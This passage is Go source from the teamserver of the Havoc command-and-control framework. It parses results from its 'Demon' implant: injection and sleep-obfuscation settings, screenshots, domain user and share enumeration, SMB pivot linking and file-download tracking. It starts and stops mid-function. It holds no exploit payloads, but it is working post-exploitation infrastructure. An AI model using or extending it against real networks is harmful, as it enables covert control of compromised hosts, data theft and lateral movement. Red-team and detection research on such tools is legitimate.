					ConfigData = Parser.ParseInt32()
					Message["Message"] = fmt.Sprintf("Default memory allocation set to %v", ConfigData.(int))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_ALLOC, Invalid packet", AgentID))
				}
				break

			case CONFIG_MEMORY_EXECUTE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_EXECUTE", AgentID))
					ConfigData = Parser.ParseInt32()
					Message["Message"] = fmt.Sprintf("Default memory executing set to %v", ConfigData.(int))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_MEMORY_EXECUTE, Invalid packet", AgentID))
				}
				break

			case CONFIG_INJECT_SPAWN64:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN64", AgentID))
					ConfigData = Parser.ParseUTF16String()
					Message["Message"] = "Default x64 target process set to " + ConfigData.(string)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN64, Invalid packet", AgentID))
				}
				break

			case CONFIG_INJECT_SPAWN32:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN32", AgentID))
					ConfigData = Parser.ParseUTF16String()
					Message["Message"] = "Default x86 target process set to " + ConfigData.(string)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPAWN32, Invalid packet", AgentID))
				}
				break

			case CONFIG_KILLDATE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt64}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE", AgentID))
					a.Info.KillDate = Parser.ParseInt64()
					teamserver.AgentUpdate(a)
					if a.Info.KillDate == 0 {
						Message["Message"] = "KillDate was disabled"
					} else {
						Message["Message"] = "KillDate has been set"
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE, Invalid packet", AgentID))
				}
				break

			case CONFIG_WORKINGHOURS:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_WORKINGHOURS", AgentID))
					a.Info.WorkingHours = int32(Parser.ParseInt32())
					teamserver.AgentUpdate(a)
					if a.Info.WorkingHours == 0 {
						Message["Message"] = "WorkingHours was disabled"
					} else {
						Message["Message"] = "WorkingHours has been set"
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_KILLDATE, Invalid packet", AgentID))
				}
				break

			case CONFIG_IMPLANT_SPFTHREADSTART:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SPFTHREADSTART", AgentID))
					ConfigData = Parser.ParseString() + "!" + Parser.ParseString()
					Message["Message"] = "Sleep obfuscation spoof thread start addr to " + ConfigData.(string)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SPFTHREADSTART, Invalid packet", AgentID))
				}
				break

			case CONFIG_IMPLANT_SLEEP_TECHNIQUE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SLEEP_TECHNIQUE", AgentID))
					ConfigData = Parser.ParseInt32()
					Message["Message"] = fmt.Sprintf("Sleep obfuscation technique set to %v", ConfigData.(int))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_SLEEP_TECHNIQUE, Invalid packet", AgentID))
				}
				break

			case CONFIG_IMPLANT_COFFEE_VEH:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_VEH", AgentID))
					ConfigData = Parser.ParseInt32()
					if ConfigData.(int) == 0 {
						ConfigData = "false"
					} else {
						ConfigData = "true"
					}
					Message["Message"] = fmt.Sprintf("Coffee VEH set to %v", ConfigData.(string))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_VEH, Invalid packet", AgentID))
				}
				break

			case CONFIG_IMPLANT_COFFEE_THREADED:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_THREADED", AgentID))
					ConfigData = Parser.ParseInt32()
					if ConfigData.(int) == 0 {
						ConfigData = "false"
					} else {
						ConfigData = "true"
					}
					Message["Message"] = fmt.Sprintf("Coffee threading set to %v", ConfigData.(string))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_COFFEE_THREADED, Invalid packet", AgentID))
				}
				break

			case CONFIG_INJECT_TECHNIQUE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_TECHNIQUE", AgentID))
					ConfigData = strconv.Itoa(Parser.ParseInt32())
					Message["Message"] = "Set default injection technique to " + ConfigData.(string)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_TECHNIQUE, Invalid packet", AgentID))
				}
				break

			case CONFIG_INJECT_SPOOFADDR:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPOOFADDR", AgentID))
					ConfigData = Parser.ParseString() + "!" + Parser.ParseString()
					Message["Message"] = "Injection thread spoofing value set to " + ConfigData.(string)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_INJECT_SPOOFADDR, Invalid packet", AgentID))
				}
				break

			case CONFIG_IMPLANT_VERBOSE:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_VERBOSE", AgentID))
					ConfigData = Parser.ParseInt32()

					if ConfigData.(int) == 0 {
						ConfigData = "false"
					} else {
						ConfigData = "true"
					}
					Message["Message"] = fmt.Sprintf("Implant verbose messaging: %v", ConfigData.(string))
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG - CONFIG_IMPLANT_VERBOSE, Invalid packet", AgentID))
				}
				break

			default:
				Message["Type"] = "Error"
				Message["Message"] = "Error while setting certain config"
				break
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
			a.RequestCompleted(RequestID)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CONFIG, Invalid packet", AgentID))
		}

		break

	case COMMAND_SCREENSHOT:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				Success = Parser.ParseInt32()
				Message = make(map[string]string)
			)

			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Success: %d", AgentID, Success))

			if Success == 1 {
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var BmpBytes = Parser.ParseBytes()
					var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"

					if len(BmpBytes) > 0 {
						err := logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
						if err != nil {
							Message["Type"] = "Error"
							Message["Message"] = "Failed to take a screenshot: " + err.Error()
							return
						}

						Message["Type"] = "Good"
						Message["Message"] = "Successfully took screenshot"

						Message["MiscType"] = "screenshot"
						Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
						Message["MiscData2"] = Name
					} else {
						Message["Type"] = "Error"
						Message["Message"] = "Failed to take a screenshot"
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Invalid packet", AgentID))
				}
			} else {
				Message["Type"] = "Error"
				Message["Message"] = "Failed to take a screenshot"
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
			a.RequestCompleted(RequestID)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SCREENSHOT, Invalid packet", AgentID))
		}

		break

	case COMMAND_NET:
		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				NetCommand = Parser.ParseInt32()
				Message    = make(map[string]string)
			)

			switch NetCommand {

			case DEMON_NET_COMMAND_DOMAIN:
				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Domain = Parser.ParseString()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DOMAIN, Domain: %s", AgentID, Domain))

					if Domain == "" {
						Message["Type"] = "Good"
						Message["Message"] = "The machine does not seem to be joined to a domain"
					} else {
						Message["Type"] = "Good"
						Message["Message"] = fmt.Sprintf("Domain for this Host: %s", Domain)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DOMAIN, Invalid packet", AgentID))
				}
				break

			case DEMON_NET_COMMAND_LOGONS:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOGONS", AgentID))
				var (
					Index  int
					Output string
				)

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Domain = Parser.ParseUTF16String()
					Output += fmt.Sprintf(" %-12s\n", "Usernames")
					Output += fmt.Sprintf(" %-12s\n", "---------")
					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
						var Name = Parser.ParseUTF16String()

						Index++

						Output += fmt.Sprintf("  %-12s\n", Name)
					}

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Logged on users at %s [%v]: ", Domain, Index)
					Message["Output"] = "\n" + Output
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOGONS, Invalid packet", AgentID))
				}

				break

			case DEMON_NET_COMMAND_SESSIONS:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SESSIONS", AgentID))
				var (
					Index  int
					Buffer bytes.Buffer
					Data   [][]string
				)

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var Domain = Parser.ParseUTF16String()

					table := tablewriter.NewWriter(&Buffer)

					table.SetBorder(false)
					table.SetHeader([]string{"Computer", "Username", "Active", "Idle"})
					table.SetBorder(false)
					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

					// table.SetRowSeparator("-")
					table.SetColumnSeparator(" ")
					table.SetCenterSeparator(" ")

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32}) {
						var (
							Client = Parser.ParseUTF16String()
							User   = Parser.ParseUTF16String()
							Time   = int(Parser.ParseInt32())
							Idle   = int(Parser.ParseInt32())
							Column []string
						)

						Index++

						Column = []string{Client, User, strconv.Itoa(Time), strconv.Itoa(Idle)}
						Data = append(Data, Column)
					}

					table.AppendBulk(Data)
					table.Render()

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Sessions for %v [%v]: ", Domain, Index)
					Message["Output"] = "\n" + Buffer.String()
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SESSIONS, Invalid packet", AgentID))
				}

				break

			case DEMON_NET_COMMAND_COMPUTER:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_COMPUTER", AgentID))
				a.RequestCompleted(RequestID)
				break

			case DEMON_NET_COMMAND_DCLIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_DCLIST", AgentID))
				a.RequestCompleted(RequestID)
				break

			case DEMON_NET_COMMAND_SHARE:
				var (
					Index  int
					Buffer bytes.Buffer
					Data   [][]string
				)

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SHARE", AgentID))

					var Domain = Parser.ParseUTF16String()

					table := tablewriter.NewWriter(&Buffer)

					table.SetBorder(false)
					table.SetHeader([]string{"Share name", "Path", "Remark", "Access"})
					table.SetBorder(false)
					table.SetHeaderAlignment(tablewriter.ALIGN_CENTER)

					// table.SetRowSeparator("-")
					table.SetColumnSeparator(" ")
					table.SetCenterSeparator(" ")

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32}) {
						var (
							Name   = Parser.ParseUTF16String()
							Path   = Parser.ParseUTF16String()
							Remark = Parser.ParseUTF16String()
							Access = int(Parser.ParseInt32())

							Column []string
						)

						Index++

						Column = []string{Name, Path, Remark, strconv.Itoa(Access)}
						Data = append(Data, Column)
					}

					table.AppendBulk(Data)
					table.Render()

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Shares for %v [%v]: ", Domain, Index)
					Message["Output"] = "\n" + Buffer.String()
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_SHARE, Invalid packet", AgentID))
				}

				break

			case DEMON_NET_COMMAND_LOCALGROUP:
				var Data string

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOCALGROUP", AgentID))

					var Domain = Parser.ParseUTF16String()

					Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
					Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
						var (
							Group       = Parser.ParseUTF16String()
							Description = Parser.ParseUTF16String()
						)

						Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
					}

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Local Groups for %v: ", Domain)
					Message["Output"] = "\n" + Data
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_LOCALGROUP, Invalid packet", AgentID))
				}
				break

			case DEMON_NET_COMMAND_GROUP:
				var Data string

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_GROUP", AgentID))
					var Domain = Parser.ParseUTF16String()

					Data += fmt.Sprintf(" %-48s %s\n", "Group", "Description")
					Data += fmt.Sprintf(" %-48s %s\n", "-----", "-----------")

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBytes}) {
						var (
							Group       = Parser.ParseUTF16String()
							Description = Parser.ParseUTF16String()
						)

						Data += fmt.Sprintf(" %-48s  %s\n", Group, Description)
					}

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("List groups on %s: ", Domain)
					Message["Output"] = "\n" + Data
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_GROUP, Invalid packet", AgentID))
				}

				break

			case DEMON_NET_COMMAND_USERS:
				var Data string

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_USERS", AgentID))
					var Target = Parser.ParseUTF16String()

					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32}) {
						var (
							User  = Parser.ParseUTF16String()
							Admin = Parser.ParseInt32()
						)

						if Admin == win32.TRUE {
							Data += fmt.Sprintf(" - %s (Admin)\n", User)
						} else {
							Data += fmt.Sprintf(" - %s \n", User)
						}
					}

					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Users on %v: ", Target)
					Message["Output"] = "\n" + Data
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - DEMON_NET_COMMAND_USERS, Invalid packet", AgentID))
				}

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET - UNKNOWN (%d)", AgentID, NetCommand))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_NET, Invalid packet", AgentID))
		}

		break

	case COMMAND_PIVOT:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				PivotCommand = Parser.ParseInt32()
				Message      = make(map[string]string)
			)

			switch PivotCommand {
			case DEMON_PIVOT_LIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_LIST", AgentID))
				var (
					Data  string
					Count int
				)

				Data += fmt.Sprintf(" %-10s %s\n", "DemonID ", "Named Pipe")
				Data += fmt.Sprintf(" %-10s %s\n", "--------", "-----------")

				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
					var (
						DemonId   int
						NamedPipe string
					)

					DemonId = Parser.ParseInt32()
					NamedPipe = Parser.ParseUTF16String()

					Data += fmt.Sprintf(" %-10x  %v\n", DemonId, NamedPipe)
					Count++
				}

				if Count > 0 {
					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("Pivot List [%v]: ", Count)
					Message["Output"] = "\n" + Data
				} else {
					Message["Type"] = "Info"
					Message["Message"] = fmt.Sprintf("No pivots connected")
				}
				a.RequestCompleted(RequestID)

			case DEMON_PIVOT_SMB_CONNECT:
				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
					var Success = Parser.ParseInt32()

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Success: %d", AgentID, Success))

					// if we successfully connected to the SMB named pipe
					if Success == 1 {

						if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {

							var (
								DemonData = Parser.ParseBytes()
								AgentHdr  Header
								err       error
							)

							// parse the agent header
							if AgentHdr, err = ParseHeader(DemonData); err == nil {

								if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
									// ignore the RequestID
									AgentHdr.Data.ParseInt32()
									// ignore the CommandID
									AgentHdr.Data.ParseInt32()

									var DemonInfo *Agent

									// if agent exist then just retrieve the instance by agent id
									if teamserver.AgentExist(AgentHdr.AgentID) {

										DemonInfo = teamserver.AgentInstance(AgentHdr.AgentID)
										Message["MiscType"] = "reconnect"
										Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)

										if DemonInfo.Pivots.Parent != nil {
											for i := range DemonInfo.Pivots.Parent.Pivots.Links {
												if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%08x", AgentHdr.AgentID) {
													DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
													break
												}
											}
										}

										DemonInfo.Active = true
										DemonInfo.Reason = ""
										DemonInfo.Pivots.Parent = a

										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
										teamserver.LinkAdd(a, DemonInfo)

										teamserver.AgentUpdate(DemonInfo)
										teamserver.AgentUpdate(a)

									} else {
										// if the agent doesn't exist then we assume that it's a register request from a new agent

										DemonInfo = ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, "")
										DemonInfo.Pivots.Parent = a

										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
										teamserver.LinkAdd(a, DemonInfo)

										DemonInfo.Info.MagicValue = AgentHdr.MagicValue

										teamserver.AgentAdd(DemonInfo)
										teamserver.AgentSendNotify(DemonInfo)
									}

									if DemonInfo != nil {
										Message["Type"] = "Good"
										Message["Message"] = "[SMB] Connected to pivot agent [" + a.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
									} else {
										Message["Type"] = "Error"
										Message["Message"] = "[SMB] Failed to connect: failed to parse the agent"
									}

								} else {
									Message["Type"] = "Error"
									Message["Message"] = "[SMB] Failed to connect: magic value isn't demon type"
								}

							} else {
								Message["Type"] = "Error"
								Message["Message"] = "[SMB] Failed to connect: " + err.Error()
							}
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] Failed to connect: Invalid response"
						}
					} else {
						if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
							logger.Debug("DEMON_PIVOT_SMB_CONNECT: Failed")
							var (
								ErrorCode          = Parser.ParseInt32()
								ErrorString, found = Win32ErrorCodes[ErrorCode]
							)

							ErrorString += " "

							if !found {
								ErrorString = ""
							}

							Message["Type"] = "Error"
							Message["Message"] = fmt.Sprintf("[SMB] Failed to connect: %v [%v]", ErrorString, ErrorCode)
						} else {
							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
						}
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_CONNECT, Invalid packet", AgentID))
				}

				break

			case DEMON_PIVOT_SMB_DISCONNECT:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Success = Parser.ParseInt32()
						AgentID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Success: %d, AgentID: %x", AgentID, Success, AgentID))

					if Success == win32.TRUE {
						Message["Type"] = "Info"
						Message["Message"] = fmt.Sprintf("[SMB] Agent disconnected %x", AgentID)

						Message["MiscType"] = "disconnect"
						Message["MiscData"] = fmt.Sprintf("%08x", AgentID)


						AgentInstance := teamserver.AgentInstance(AgentID)
						if AgentInstance != nil {
							teamserver.LinkRemove(a, AgentInstance, true)
						}
					} else {
						Message["Type"] = "Error"
						Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
					}
					a.RequestCompleted(RequestID)
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_DISCONNECT, Invalid packet", AgentID))
				}

				break

			case DEMON_PIVOT_SMB_COMMAND:

				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
					var (
						Package       = Parser.ParseBytes()
						AgentHdr, err = ParseHeader(Package)
					)

					if err == nil {

						if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
							var PivotAgent *Agent

							PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
							if PivotAgent != nil {
								PivotAgent.UpdateLastCallback(teamserver)
								//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s, Command: %d", AgentID, PivotAgent.NameID, Command))

								// while we can read a command and request id, parse new packages
								first_iter := true
								for (AgentHdr.Data.CanIRead(([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}))) {
									var Command   = uint32(AgentHdr.Data.ParseInt32())
									var Request   = uint32(AgentHdr.Data.ParseInt32())

									if first_iter {
										first_iter = false
										// if the message is not a reconnect, decrypt the buffer
										AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PivotAgent.Encryption.AESIv)
									}

									/* The agent is sending us the result of a task */
									if Command != COMMAND_GET_JOB {
										Parser := parser.NewParser(AgentHdr.Data.ParseBytes())
										PivotAgent.TaskDispatch(Request, Command, Parser, teamserver)
									}
								}
							} else {
								Message["Type"] = "Error"
								Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
							}

						} else {
							Message["Type"] = "Error"
							Message["Message"] = "[SMB] Response magic value isn't demon type"
						}
					} else {
						Message["Type"] = "Error"
						Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
					}
				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Invalid packet", AgentID))
				}

				break

			default:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - UNKNOWN (%d)", AgentID, PivotCommand))
			}

			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
		} else {
			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT, Invalid packet", AgentID))
		}

		break

	case COMMAND_TRANSFER:

		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
			var (
				SubCommand = Parser.ParseInt32()
				Message    map[string]string
			)

			switch SubCommand {

			case DEMON_COMMAND_TRANSFER_LIST:
				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_LIST", AgentID))
				var (
					Data  string
					Count int
				)

				Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "File ID", "Size", "Progress", "State", "File")
				Data += fmt.Sprintf(" %-8s  %-8s  %-8s  %-8s %s\n", "-------", "----", "--------", "-----", "----")

				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
					var (
						FileID = Parser.ParseInt32()
						Size   = Parser.ParseInt32()
						State  = Parser.ParseInt32()
					)

					if download := a.DownloadGet(FileID); download != nil {
						var (
							StateString string
							Progress    string
						)

						if State == DOWNLOAD_STATE_RUNNING {
							StateString = "Running"
						} else if State == DOWNLOAD_STATE_STOPPED {
							StateString = "Stopped"
						} else if State == DOWNLOAD_STATE_REMOVE {
							/* pending remove */
							StateString = "Removed"
						}

						Progress = fmt.Sprintf("%.2f%%", common.PercentageChange(Size, download.TotalSize))
						Data += fmt.Sprintf(" %-8x  %-8s  %-8s  %-8s %s\n", FileID, common.ByteCountSI(int64(download.TotalSize)), Progress, StateString, download.FilePath)
						Count++
					}
				}

				Message = map[string]string{
					"Type":    "Info",
					"Message": fmt.Sprintf("List downloads [%v current downloads]:", Count),
					"Output":  "\n" + Data,
				}
				a.RequestCompleted(RequestID)
				break

			case DEMON_COMMAND_TRANSFER_STOP:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Found  = Parser.ParseInt32()
						FileID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_STOP, Found: %d, FileID: %x", AgentID, Found, FileID))

					if Found == win32.TRUE {
						if download := a.DownloadGet(FileID); download != nil {
							Message = map[string]string{
								"Type":    "Good",
								"Message": fmt.Sprintf("Successful found and stopped download: %x", FileID),
							}
						} else {
							Message = map[string]string{
								"Type":    "Error",
								"Message": fmt.Sprintf("Couldn't stop download %x: Download does not exists", FileID),
							}
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't stop download %x: FileID not found", FileID),
						}
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_STOP, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Error",
						"Message": fmt.Sprintf("Callback output is smaller than expected. Callback type COMMAND_TRANSFER with subcommand 0x1 (stop). Expected at least 8 bytes but received %v bytes", Parser.Length()),
					}
				}
				a.RequestCompleted(RequestID)
				break

			case DEMON_COMMAND_TRANSFER_RESUME:

				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
					var (
						Found  = Parser.ParseInt32()
						FileID = Parser.ParseInt32()
					)

					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_RESUME, Found: %d, FileID: %x", AgentID, Found, FileID))

					if Found == win32.TRUE {
						if download := a.DownloadGet(FileID); download != nil {
							Message = map[string]string{
								"Type":    "Good",
								"Message": fmt.Sprintf("Successful found and resumed download: %x", FileID),
							}
						} else {
							Message = map[string]string{
								"Type":    "Error",
								"Message": fmt.Sprintf("Couldn't resume download %x: Download does not exists", FileID),
							}
						}
					} else {
						Message = map[string]string{
							"Type":    "Error",
							"Message": fmt.Sprintf("Couldn't resume download %x: FileID not found", FileID),
						}
					}

				} else {
					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TRANSFER - DEMON_COMMAND_TRANSFER_RESUME, Invalid packet", AgentID))
					Message = map[string]string{
						"Type":    "Error",
